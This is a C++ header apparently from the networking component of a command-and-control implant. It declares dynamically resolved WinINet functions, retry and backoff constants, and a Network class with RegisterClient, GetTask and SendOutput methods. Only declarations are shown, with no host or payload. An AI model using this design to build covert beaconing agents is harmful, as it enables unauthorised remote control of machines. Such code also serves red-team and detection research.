#pragma once
#include <Windows.h>
#include <wininet.h>
#include "../shared/common.hpp"

#define DECL(x) decltype(x) * x;

struct HTTPAPIS {
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(InternetSetOptionA);
	DECL(HttpAddRequestHeadersA);
};

#define MAX_RETRYS 5
#define BASE_DELAY_MS 100
#define MAX_DELAY_MS 3000


class Network {
	HTTPAPIS* HttpApis;
	DWORD reqFlags;

public:
	Network();
	BOOL RegisterClient(PBYTE Data, SIZE_T DataLength);
	BOOL GetTask(PBYTE OutData, SIZE_T BufSize);
	BOOL SendOutput(PBYTE InData, SIZE_T InLen);

};

extern Network* g_Network;